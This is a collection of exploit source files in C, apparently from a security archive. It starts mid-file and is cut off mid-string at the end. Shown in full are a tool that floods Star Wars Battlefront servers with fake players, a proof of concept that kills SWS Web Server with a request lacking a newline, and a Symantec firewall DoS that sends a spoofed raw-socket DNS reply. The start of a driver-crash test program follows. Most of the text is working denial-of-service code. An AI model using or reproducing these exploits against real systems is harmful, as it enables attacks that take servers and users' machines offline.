    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif



/*
    Copyright 2004,2005,2006,2007,2008,2009 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    aint with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl-2.0.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "show_dump.h"
#include "swbcrc.h"
#include "rwbits.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef unsigned char   u8;
typedef unsigned short  u16;
typedef unsigned int    u32;



#define VER         "0.4"
#define BUFFSZ      8192
#define PORT        3658
#define CHR         'a'

                    /* SWB decodes 32 bits of data each time */
#define SWBFPAD     pcklen = 5 + (b >> 3); \
                    if(b & 7) pcklen++; \
                    i = (pcklen - 5) & 3; \
                    if(i) pcklen += (4 - i);
#define SWBFPADX    i = b >> 3; \
                    if(b & 7) i++; \
                    if(i & 3) i += (4 - (i & 3)); \
                    b = (i + 4) << 3;
                    /* 4 = there is a 32 bit number between the 2 bits containers */



int write_bitstring(u8 *b, int bits, u8 *str);
void show_info_1_1(u8 *data);
int get_num(u8 *str);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer,
                        peerl;
    u32     b,
            mem_offset  = 0;
    int     sd,
            i,
            len,
            pcklen,
            timewait    = 1,
            hexdump     = 0,
            guests      = 0,
            src_nat     = 0,
            dst_nat     = 0,
            //info_only   = 0,
            only_one    = 0,
            guest_bits  = 3,
            server_ver  = 0;    // 0 = 1.0 and 1.01, 1 = 1.1, and so on
    u16     port = PORT;
    u8      *buff,
            *p5,
            *pck,
            *nick       = "",
            *pwd        = "";

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Star Wars Battlefront 1 and 2 Fake Players DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s [options] <host>\n"
            "\n"
            "Options:\n"
            "-o        enable the SWBF1 1.3 compatibility mode: 1 bit for the guest field\n"
            "          and version 104 (by default the tool works with SWBF2)\n" 
            "-p PORT   server port (%d)\n"
            "-n NICK   the nick you want to use for your fake player (default is none)\n"
            "-w PASS   the password to use if the server is protected\n"
            //"-i        shows server informations and exits. Works perfectly with servers\n"
            //"          >= 1.1 but second half of the info are wrong for servers <= 1.01\n"
            //"-t SEC    seconds to wait when the server is full, default is 1\n"
            "-v NUM    version number to use for joining a server, by default the number\n"
            "          is automatically scanned finding the exact server version\n"
            "-1        one player only\n"
            "\n"
            "Test options and tests for old vulnerabilities:\n"
            "-x        show the hex dump of the join-reply packets received\n"
            "-g        enable the guest player, practically one single packet is able to\n"
            "          fill 2 or more player positions and one of them is called Guest\n"
            "-s SIZE   use a nickname constituited by SIZE chars '%c' (max 255)\n"
            "-m OFFSET enable a server's option that lets clients to send a memory location\n"
            "          that will be read by the server (SWBF2 and PS2 don't support it)\n"
            "-f NUM    another test option that enable the usage of internal IPs (NAT).\n"
            "          since it is only for testing, all the IP and port used by this tool\n"
            "          are those of the same server. use -f 1 to enable client's NAT, 2 for\n"
            "          the server or 3 to enable both\n"
            "\n", argv[0], port, CHR);
        exit(1);
    }

    argc--;
    for(i = 1; i < argc; i++) {
        switch(argv[i][1]) {
            case 'o': { guest_bits = 1; server_ver = 104; } break;
            case 'p': port          = atoi(argv[++i]);      break;
            case 'n': nick          = argv[++i];            break;
            case 'w': pwd           = argv[++i];            break;
            //case 'i': info_only     = 1;                    break;
            //case 't': timewait      = atoi(argv[++i]);      break;
            case 'v': server_ver    = atoi(argv[++i]);      break;
            case '1': only_one      = 1;                    break;
            case 'x': hexdump       = 1;                    break;
            case 'g': guests        = 0xffffffff;           break;
            case 's': {
                len = atoi(argv[++i]);
                nick = malloc(len + 1);
                if(!nick) std_err();
                memset(nick, CHR, len);
                nick[len] = 0;
                } break;
            case 'm': mem_offset    = get_num(argv[++i]);   break;
            case 'f': {
                switch(atoi(argv[++i])) {
                    case 1: src_nat = 1; break;
                    case 2: dst_nat = 1; break;
                    case 3: src_nat = dst_nat = 1; break;
                    default: {
                        printf("\nError: NAT options are 1, 2 or 3\n\n");
                        exit(1);
                        } break;
                }
                } break;
            default: {
                printf("\nError: wrong command-line argument (%s)\n\n", argv[i]);
                exit(1);
                } break;
        }
    }

    peer.sin_addr.s_addr  = resolv(argv[argc]);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    peerl.sin_addr.s_addr = INADDR_ANY;
    peerl.sin_port        = htons(time(NULL));
    peerl.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    pck = malloc(BUFFSZ);
    if(!pck) std_err();
    p5 = pck + 5;
    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    memset(pck, 0, BUFFSZ);
    pck[0] = 2;    // info packet
    pck[1] = 0;
    *(u16 *)(pck + 2) = 0xffff;
    *(u16 *)(pck + 4) = 0;

    b = 0;
    b = write_bits(0, 1, p5, b);
    b = write_bits(time(NULL), 32, p5, b); // track ID 1 | used to track our
    b = write_bits(0, 4, p5, b);           // track ID 2 | query in the reply
    SWBFPAD

    printf("- request informations:\n");
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(!sd) std_err();
    len = send_recv(sd, pck, pcklen, buff, BUFFSZ, &peer, 1);
    if(len > 0) show_info_1_1(buff);
    close(sd);

    //if(info_only) return(0);

    memset(pck, 0, BUFFSZ);
    pck[0] = 4;    // join packet
    pck[1] = 0;
    *(u16 *)(pck + 2) = 0xffff;
    *(u16 *)(pck + 4) = 0;

    b = 0;
    b = write_bits(server_ver, 12, p5, b);
    b = write_bits(swbcrc(pwd, strlen(pwd)), 32, p5, b);
    guests &= ((1 << guest_bits) - 1);
    b = write_bits(guests, guest_bits, p5, b);    // number of guests to add
    b = write_bits(1, 2, p5, b);
    b = write_bitstring(p5, b, nick);

    SWBFPADX

    printf("- add %d guests\n", guests);
    for(i = 0; i < guests; i++) {
        b = write_bitstring(p5, b, nick);   // names of the guests (in reality only the first guest uses it)
    }
    b = write_bits(0, 32, p5, b);
    for(i = 0; i < guests; i++) {
        b = write_bits(0, 32, p5, b);
    }
    b = write_bits(mem_offset ? 1 : 0, 1, p5, b);
    if(mem_offset) b = write_bits(mem_offset, 32, p5, b);   // this is the "player is crashed" field
    b = write_bits(1, 1, p5, b);
    b = write_bits(1, 1, p5, b);
    b = write_bits(ntohl(peer.sin_addr.s_addr), 32, p5, b); // client IP
    b = write_bits(port, 16, p5, b);                        // client port
    b = write_bits(src_nat ? 1 : 0, 1, p5, b);
    if(src_nat) {                                           // LAN IP and port of the client
        b = write_bits(1, 1, p5, b);
        b = write_bits(ntohl(peer.sin_addr.s_addr), 32, p5, b);
        b = write_bits(port, 16, p5, b);
    }
    b = write_bits(ntohl(peer.sin_addr.s_addr), 32, p5, b); // server IP
    b = write_bits(port, 16, p5, b);                        // server port
    b = write_bits(dst_nat ? 1 : 0, 1, p5, b);
    if(dst_nat) {                                           // LAN IP and port of the server
        b = write_bits(1, 1, p5, b);
        b = write_bits(ntohl(peer.sin_addr.s_addr), 32, p5, b);
        b = write_bits(port, 16, p5, b);
    }
    b = write_bits(0, 1, p5, b);
    b = write_bits(0, 32, p5, b);  // if 0x31303030 ("1000") does something with the string swbf2.zip
    SWBFPAD

    printf("- start fake players attack:\n\n");
    for(;;) {
        printf("  player: ");

        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();
        do {
            peerl.sin_port++;
        } while(bind(sd, (struct sockaddr *)&peerl, sizeof(struct sockaddr_in)) < 0);

        len = send_recv(sd, pck, pcklen, buff, BUFFSZ, &peer, 1);
        close(sd);

        if(hexdump) {
            fputc('\n', stdout);
            show_dump(buff, len, stdout);
        }

        if(buff[0] == 5) {
            if(buff[5] == 1) {
                printf(" server full\n");
                sleep(timewait * ONESEC);
                continue;
            } else if(buff[5] == 2) {
                printf("\n"
                    "Error: seems the server is password protected, use the -w option to specify\n"
                    "       the correct keyword\n"
                    "\n");
                exit(1);
            } if(buff[5] == 4) {
                server_ver = read_bits(12, p5, 0);
                printf(" wrong version (%d), I try to scan the next version\n", server_ver++);
                write_bits(server_ver, 12, p5, 0);
                continue;
            } else {
                printf("\nError: unknown error (%02x), check the following dump:\n", buff[5]);
                exit(1);
            }
        }

        printf(" ok\n");
        if(only_one) break;
    }

    printf("\n- done\n");
    return(0);
}



int write_bitstring(u8 *data, int b, u8 *str) {
    int     i,
            len;

    len = strlen(str);
    b = write_bits(len, 8, data, b);
    for(i = 0; i < len; i++) {
        b = write_bits(str[i], 8, data, b);
    }
    return(b);
}



void show_info_1_1(u8 *data) { // blah
    u32     len,
            b = 0;

    data += 5;
    read_bits(32, data, b); b += 32;      // track ID 1, the same of our query
    read_bits(4, data, b);  b += 4;       // track ID 1, the same of our query
    printf("\n  Server name:        ");
    len = read_bits(8, data, b);                                                b += 8;
    while(len--) {
        fputc(read_bits(8, data, b), stdout);                                   b += 8;
    }
    printf("\n  Gametype:           ");
    len = read_bits(8, data, b);                                                b += 8;
    while(len--) {
        fputc(read_bits(8, data, b), stdout);                                   b += 8;
    }
    printf("\n  Mission:            ");
    len = read_bits(8, data, b);                                                b += 8;
    while(len--) {
        fputc(read_bits(8, data, b), stdout);                                   b += 8;
    }
    printf("\n\n");
    return;

    printf("  Dedicated           %s\n", read_bits(1, data, b) ? "on" : "off"); b += 1;
    printf("  Team Auto Assign    %s\n", read_bits(1, data, b) ? "on" : "off"); b += 1;
    printf("  Heroes              %s\n", read_bits(1, data, b) ? "on" : "off"); b += 1;
    printf("  Team Damage         %s\n", read_bits(1, data, b) ? "on" : "off"); b += 1;
    printf("  Password            %s\n", read_bits(1, data, b) ? "on" : "off"); b += 1;
    printf("  AI Units            %u\n", read_bits(8, data, b));                b += 8;
    printf("  Score               %u to ", read_bits(11, data, b));             b += 11;
    printf("%u\n", read_bits(11, data, b));                                     b += 11;
    printf("  Players             %u\n", read_bits(7, data, b));                b += 7;
    len = read_bits(7, data, b);                                                b += 7;
    if(!len) {
        printf("\n"
            " The version of this server is not compatible with the query protocol used by\n"
            " this tool. All the informations until Password should be correct\n"
            "\n");
        return;
    }
    printf("  Max Players         %u\n", len);
    printf("  ???                 %u\n", read_bits(3, data, b));                b += 3;
    printf("  ???                 %u\n", read_bits(8, data, b));                b += 8;
    printf("  Min Players         %u\n", read_bits(7, data, b));                b += 7;
    printf("  AI Difficulty       %u\n", read_bits(2, data, b));                b += 2;
    printf("  Show Player Names   %s\n", read_bits(1, data, b) ? "on" : "off"); b += 1;
    printf("  Spawn Invincibility %u\n", read_bits(6, data, b));                b += 6;
    fputc('\n', stdout);
}



int get_num(u8 *str) {
    int     offset;

    if(!strncmp(str, "0x", 2) || !strncmp(str, "0X", 2)) {
        sscanf(str + 2, "%x", &offset);
    } else {
        sscanf(str, "%u", &offset);
    }
    return(offset);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry,
            len;

    if(in && !out) {
        fputc('.', stdout);
        if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
          < 0) goto quit;
        return(0);
    }
    if(in) {
        for(retry = 2; retry; retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!timeout(sd, 1)) break;
        }

        if(!retry) {
            if(!err) return(-1);
            printf("\nError: socket timeout, no reply received\n\n");
            exit(1);
        }
    } else {
        if(timeout(sd, 3) < 0) return(-1);
    }

    fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct hostent *hp;
    u32 host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

source: http://www.securityfocus.com/bid/5664/info

SWS Simple Web Server is prone to a denial of service when requests not ending with a newline are received.

Remote attackers may exploit this condition to deny access to legitimate users of the web server. 

/*
 * Mon Sep  2 17:45:04 2002
 *
 * |SaMaN| aka Mert <saman@hush.com>
 *
 * Information  : Anyone can kill SWS Web Server v0.1.0 remotely.
 *
 * Proof of Concept Exploit for SWS Web Server v0.1.0
 *
 * SWS homepage : http://www.linuxprogramlama.com
 *
 * Tested on    : Slackware 8.1 - 2.4.18
 *              : Redhat 7.0    - 2.2.16-22
 *
 * Problem      : sws_web_server.c
 *              : line 108
 *              : if (recvBuffer[i - 1] != '\n') break;
 *
 * Q : So what will happen when we send a string not end with '\n' ?
 * A : break break break
 * Q : So root should restart web server everytime ?
 * A : Yes
 * Q : Other web servers act like this ?
 * A : No
 * Q : So something is wrong ?
 * A : Yes :)
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define K  "\033[1;31m"
#define Y  "\033[1;32m"
#define SA "\033[1;33m"
#define M  "\033[1;34m"

#define PORT 80

int main(int argc, char *argv[])
{
   int sockfd, numbytes;
   struct hostent *adres;
   struct sockaddr_in hedef;

   char buf[8] = "|SaMaN|";

   if (argc != 2) {
      printf("%s=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n", K);
      printf("%sSWS Web Killer (saman@hush.com)  \n", SA);
      printf("%s=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n", K);
      printf("%sUsage: ./sws_web_killer %s<IP>   \n",Y,M);
      return 0;
   }

   if ((adres=gethostbyname(argv[1])) == NULL) {
      perror("gethostbyname");
      exit(1);
   }

   if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
      perror("socket");
      exit(1);
   }

   hedef.sin_family = AF_INET;
   hedef.sin_port = htons(PORT);
   hedef.sin_addr = *((struct in_addr *)adres->h_addr);
   memset(&(hedef.sin_zero), '\0', 8);

   if (connect(sockfd, (struct sockaddr *)&hedef,
                                     sizeof(struct sockaddr)) == -1)
   {
        perror("connect");
        exit(1);
   }

   if ((numbytes=send(sockfd, buf, strlen(buf), 0)) == -1) {
        perror("send");
        exit(1);
   }

   close(sockfd);

   return 0;
}
/* HOD-symantec-firewall-DoS-expl.c:
 *
 * Symantec Multiple Firewall DNS Response Denial-of-Service
 *
 * Exploit version 0.1 coded by
 *
 *
 *                 .::[ houseofdabus ]::.
 *
 *
 *
 * Bug discoveried by eEye:
 * http://www.eeye.com/html/Research/Advisories/AD20040512B.html
 *
 * -------------------------------------------------------------------
 * Tested on:
 *    - Symantec Norton Personal Firewall 2004
 *
 *
 * Systems Affected:
 *    - Symantec Norton Internet Security 2002
 *    - Symantec Norton Internet Security 2003
 *    - Symantec Norton Internet Security 2004
 *    - Symantec Norton Internet Security Professional 2002
 *    - Symantec Norton Internet Security Professional 2003
 *    - Symantec Norton Internet Security Professional 2004
 *    - Symantec Norton Personal Firewall 2002
 *    - Symantec Norton Personal Firewall 2003
 *    - Symantec Norton Personal Firewall 2004 
 *    - Symantec Client Firewall 5.01, 5.1.1 
 *    - Symantec Client Security 1.0, 1.1, 2.0(SCF 7.1)
 *    - Symantec Norton AntiSpam 2004
 *
 * -------------------------------------------------------------------
 * Description:
 *    eEye Digital Security has discovered a second vulnerability
 *    in the Symantec firewall product line that can be remotely
 *    exploited to cause a severe denial-of-service condition on
 *    systems running a default installation of an affected version
 *    of the product. By sending a single malicious DNS (UDP port 53)
 *    response packet to a vulnerable host, an attacker can cause
 *    the Symantec DNS response validation code to enter an infinite
 *    loop within the kernel, amounting to a system freeze that requires
 *    the machine to be physically rebooted in order to restore operation.
 *
 * -------------------------------------------------------------------
 * Compile:
 *    Win32/VC++  : cl -o HOD-sym-DoS-expl HOD-sym-DoS-expl.c ws2_32.lib
 *    Win32/cygwin: gcc -o HOD-sym-DoS-expl HOD-sym-DoS-expl.c -lws2_32.lib
 *    Linux       : gcc -o HOD-sym-DoS-expl HOD-sym-DoS-expl.c -Wall
 *
 * -------------------------------------------------------------------
 * Command Line Parameters/Arguments:
 *
 *    HOD-symantec-firewall-DoS-expl [-fi:str] [-tp:int] [-ti:str] [-n:int] 
 *
 *           -fi:IP    From (sender) IP address
 *           -tp:int   To (recipient) port number
 *           -ti:IP    To (recipient) IP address
 *           -n:int    Number of times to send message
 *
 */


#ifdef _WIN32
#pragma comment(lib,"ws2_32")
#pragma pack(1)
#define WIN32_LEAN_AND_MEAN 
#include <winsock2.h>
#include <ws2tcpip.h> /* IP_HDRINCL */
#include <stdio.h>
#include <stdlib.h>

#else
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/timeb.h>
#include <string.h>
#endif

#define MAX_MESSAGE        4068
#define MAX_PACKET         4096

#define DEFAULT_PORT       53
#define DEFAULT_IP         "10.0.0.1"
#define DEFAULT_COUNT      1

#ifndef _WIN32
#       define FAR
#endif


/* Define the DNS header */
char dnsreply[] =
"\xc9\x9c"  /* Transaction ID */
"\x80\x00"  /* Flags (bit 15: response) */
"\x00\x01"  /* Number of questions */
"\x00\x01"  /* Number of answer RRs */
"\x00\x00"  /* Number of authority RRs */
"\x00\x00"  /* Number of additional RRs */
"\xC0\x0C"; /* Compressed name pointer to itself */


/* Define the IP header */
typedef struct ip_hdr {
    unsigned char  ip_verlen;        /* IP version & length */
    unsigned char  ip_tos;           /* IP type of service */
    unsigned short ip_totallength;   /* Total length */
    unsigned short ip_id;            /* Unique identifier */
    unsigned short ip_offset;        /* Fragment offset field */
    unsigned char  ip_ttl;           /* Time to live */
    unsigned char  ip_protocol;      /* Protocol */
    unsigned short ip_checksum;      /* IP checksum */
    unsigned int   ip_srcaddr;       /* Source address */
    unsigned int   ip_destaddr;      /* Destination address */
} IP_HDR, *PIP_HDR, FAR* LPIP_HDR;

/* Define the UDP header */
typedef struct udp_hdr {
    unsigned short src_portno;       /* Source port number */
    unsigned short dst_portno;       /* Destination port number */
    unsigned short udp_length;       /* UDP packet length */
    unsigned short udp_checksum;     /* UDP checksum (optional) */
} UDP_HDR, *PUDP_HDR;


/* globals */
unsigned long  dwToIP,               // IP to send to
               dwFromIP;             // IP to send from (spoof)
unsigned short iToPort,              // Port to send to
               iFromPort;            // Port to send from (spoof)
unsigned long  dwCount;              // Number of times to send
char           strMessage[MAX_MESSAGE]; // Message to send



void
usage(char *progname) {
	printf("Usage:\n\n");
    printf("%s <-fi:SRC-IP> <-ti:VICTIM-IP> [-tp:DST-PORT] [-n:int]\n\n", progname);
    printf("       -fi:IP    From (sender) IP address\n");
    printf("       -tp:int   To (recipient) open UDP port number:\n");
	printf("                 137, 138, 445, 500(default)\n");
    printf("       -ti:IP    To (recipient) IP address\n");
    printf("       -n:int    Number of times\n");
    exit(1);
}

void
ValidateArgs(int argc, char **argv)
{
    int                i;

    iToPort = 500;
    iFromPort = DEFAULT_PORT;
    dwToIP = inet_addr(DEFAULT_IP);
    dwFromIP = inet_addr(DEFAULT_IP); 
    dwCount = DEFAULT_COUNT;
	memcpy(strMessage, dnsreply, sizeof(dnsreply)-1);

    for(i = 1; i < argc; i++) {
        if ((argv[i][0] == '-') || (argv[i][0] == '/')) {
            switch (tolower(argv[i][1])) {
                case 'f':
                    switch (tolower(argv[i][2])) {
                        case 'i':
                            if (strlen(argv[i]) > 4)
                                dwFromIP = inet_addr(&argv[i][4]);
                            break;
                        default:
                            usage(argv[0]);
                            break;
                    }    
                    break;
                case 't':
                    switch (tolower(argv[i][2])) {
                        case 'p':
                            if (strlen(argv[i]) > 4)
                                iToPort = atoi(&argv[i][4]);
                            break;
                        case 'i':
                            if (strlen(argv[i]) > 4)
                                dwToIP = inet_addr(&argv[i][4]);
                            break;
                        default:
                            usage(argv[0]);
                            break;
                    }    
                    break;
                case 'n':
                    if (strlen(argv[i]) > 3)
                        dwCount = atol(&argv[i][3]);
                    break;
                default:
                    usage(argv[0]);
                    break;
            }
        }
    }
    return;
}


/*    This function calculates the 16-bit one's complement sum */
/*    for the supplied buffer */
unsigned short
checksum(unsigned short *buffer, int size)
{
    unsigned long cksum=0;

    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(unsigned short);   
    }
    if (size) {
        cksum += *(unsigned char *)buffer;   
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16); 

    return (unsigned short)(~cksum); 
}




int
main(int argc, char **argv)
{
#ifdef _WIN32
    WSADATA            wsd;
#endif
    int                s;
#ifdef _WIN32
	BOOL                bOpt;
#else
	int                bOpt;
#endif
    struct sockaddr_in remote;
    IP_HDR             ipHdr;
    UDP_HDR            udpHdr;
    int                ret;
    unsigned long      i;
    unsigned short     iTotalSize,
                       iUdpSize,
                       iUdpChecksumSize,
                       iIPVersion,
                       iIPSize,
                       cksum = 0;
    char               buf[MAX_PACKET],
                       *ptr = NULL;
#ifdef _WIN32
    IN_ADDR            addr;
#else
	struct sockaddr_in addr;
#endif

	printf("\nSymantec Multiple Firewall DNS Response Denial-of-Service exploit v0.1\n");
    printf("Bug discoveried by eEye:\n");
    printf("http://www.eeye.com/html/Research/Advisories/AD20040512B.html\n\n");
	printf("--- Coded by .::[ houseofdabus ]::. ---\n\n");

	if (argc < 3) usage(argv[0]);

    /* Parse command line arguments and print them out */
    ValidateArgs(argc, argv);
#ifdef _WIN32
    addr.S_un.S_addr = dwFromIP;
    printf("[*] From IP: <%s>, port: %d\n", inet_ntoa(addr), iFromPort);
    addr.S_un.S_addr = dwToIP;
    printf("[*] To   IP: <%s>, port: %d\n", inet_ntoa(addr), iToPort);
    printf("[*] Count:   %d\n", dwCount);
#else
    addr.sin_addr.s_addr = dwFromIP;
    printf("[*] From IP: <%s>, port: %d\n", inet_ntoa(addr.sin_addr), iFromPort);
    addr.sin_addr.s_addr = dwToIP;
    printf("[*] To   IP: <%s>, port: %d\n", inet_ntoa(addr.sin_addr), iToPort);
    printf("[*] Count:   %d\n", dwCount);
#endif

#ifdef _WIN32
    if (WSAStartup(MAKEWORD(2,2), &wsd) != 0) {
        printf("[-] WSAStartup() failed: %d\n", GetLastError());
        return -1;
    }
#endif
    /*  Creating a raw socket */
    s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
#ifdef _WIN32
    if (s == INVALID_SOCKET) {
        printf("[-] WSASocket() failed: %d\n", WSAGetLastError());
        return -1;
    }
#endif

    /* Enable the IP header include option */
#ifdef _WIN32
    bOpt = TRUE;
#else
    bOpt = 1;
#endif
    ret = setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&bOpt, sizeof(bOpt));
#ifdef _WIN32
    if (ret == SOCKET_ERROR) {
        printf("[-] setsockopt(IP_HDRINCL) failed: %d\n", WSAGetLastError());
        return -1;
    }
#endif
    /* Initalize the IP header */
    iTotalSize = sizeof(ipHdr) + sizeof(udpHdr) + sizeof(dnsreply)-1;

    iIPVersion = 4;
    iIPSize = sizeof(ipHdr) / sizeof(unsigned long);

    ipHdr.ip_verlen = (iIPVersion << 4) | iIPSize;
    ipHdr.ip_tos = 0;                         /* IP type of service */
    ipHdr.ip_totallength = htons(iTotalSize); /* Total packet len */
    ipHdr.ip_id = 0;                 /* Unique identifier: set to 0 */
    ipHdr.ip_offset = 0;             /* Fragment offset field */
    ipHdr.ip_ttl = 128;              /* Time to live */
    ipHdr.ip_protocol = 0x11;        /* Protocol(UDP) */
    ipHdr.ip_checksum = 0 ;          /* IP checksum */
    ipHdr.ip_srcaddr = dwFromIP;     /* Source address */
    ipHdr.ip_destaddr = dwToIP;      /* Destination address */

    /* Initalize the UDP header */
    iUdpSize = sizeof(udpHdr) + sizeof(dnsreply)-1;

    udpHdr.src_portno = htons(iFromPort) ;
    udpHdr.dst_portno = htons(iToPort) ;
    udpHdr.udp_length = htons(iUdpSize) ;
    udpHdr.udp_checksum = 0 ;


	iUdpChecksumSize = 0;
    ptr = buf;
	memset(buf, 0, MAX_PACKET);

    memcpy(ptr, &ipHdr.ip_srcaddr,  sizeof(ipHdr.ip_srcaddr));  
    ptr += sizeof(ipHdr.ip_srcaddr);
    iUdpChecksumSize += sizeof(ipHdr.ip_srcaddr);

    memcpy(ptr, &ipHdr.ip_destaddr, sizeof(ipHdr.ip_destaddr)); 
    ptr += sizeof(ipHdr.ip_destaddr);
    iUdpChecksumSize += sizeof(ipHdr.ip_destaddr);

    ptr++;
    iUdpChecksumSize += 1;

    memcpy(ptr, &ipHdr.ip_protocol, sizeof(ipHdr.ip_protocol)); 
    ptr += sizeof(ipHdr.ip_protocol);
    iUdpChecksumSize += sizeof(ipHdr.ip_protocol);

    memcpy(ptr, &udpHdr.udp_length, sizeof(udpHdr.udp_length)); 
    ptr += sizeof(udpHdr.udp_length);
    iUdpChecksumSize += sizeof(udpHdr.udp_length);
    
    memcpy(ptr, &udpHdr, sizeof(udpHdr)); 
    ptr += sizeof(udpHdr);
    iUdpChecksumSize += sizeof(udpHdr);

	for(i = 0; i < sizeof(dnsreply)-1; i++, ptr++)
        *ptr = strMessage[i];
    iUdpChecksumSize += sizeof(dnsreply)-1;

    cksum = checksum((unsigned short *)buf, iUdpChecksumSize);
    udpHdr.udp_checksum = cksum;


	memset(buf, 0, MAX_PACKET);
    ptr = buf;

    memcpy(ptr, &ipHdr, sizeof(ipHdr));   ptr += sizeof(ipHdr);
    memcpy(ptr, &udpHdr, sizeof(udpHdr)); ptr += sizeof(udpHdr);
    memcpy(ptr, strMessage, sizeof(dnsreply)-1);

    remote.sin_family = AF_INET;
    remote.sin_port = htons(iToPort);
    remote.sin_addr.s_addr = dwToIP;
   
    for(i = 0; i < dwCount; i++) {
#ifdef _WIN32
        ret = sendto(s, buf, iTotalSize, 0, (SOCKADDR *)&remote, 
            sizeof(remote));

        if (ret == SOCKET_ERROR) {
            printf("[-] sendto() failed: %d\n", WSAGetLastError());
            break;
        } else
#else
        ret = sendto(s, buf, iTotalSize, 0, (struct sockaddr *) &remote, 
            sizeof(remote));
#endif
            printf("[+] sent %d bytes\n", ret);
    }

#ifdef _WIN32
    closesocket(s);
    WSACleanup();
#endif

    return 0;
}



// milw0rm.com [2004-05-16]
source: http://www.securityfocus.com/bid/23241/info

Multiple Symantec products are prone to a local denial-of-service vulnerability.

This issue occurs when attackers supply invalid argument values to the 'SPBBCDrv.sys' driver.

A local attacker may exploit this issue to crash affected computers, denying service to legitimate users. 

/*

 Testing program for Multiple insufficient argument validation of hooked SSDT function (BTP00000P002NF)
 

 Usage:
 prog FUNCNAME
   FUNCNAME - name of function to be checked

 Description:
 This program calls given function with parameters that cause the crash of the system. This happens because of 
 insufficient check of function arguments in the driver of the firewall.

 Test:
 Running the testing program with the name of function from the list of functions with insufficient check
 of arguments.

*/

#undef __STRICT_ANSI__
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <ddk/ntapi.h>
#include <ddk/ntifs.h>

void about(void)
{
  printf("Testing program for Multiple insufficient argument validation of hooked SSDT function (BTP00000P002NF)\n");
  printf("Windows Personal Firewall analysis project\n");
  printf("Copyright 2007 by Matousec - Transparent security\n");
  printf("http://www.matousec.com/""\n\n");
  return;
}

void usage(void)
{
  printf("Usage: test FUNCNAME\n"
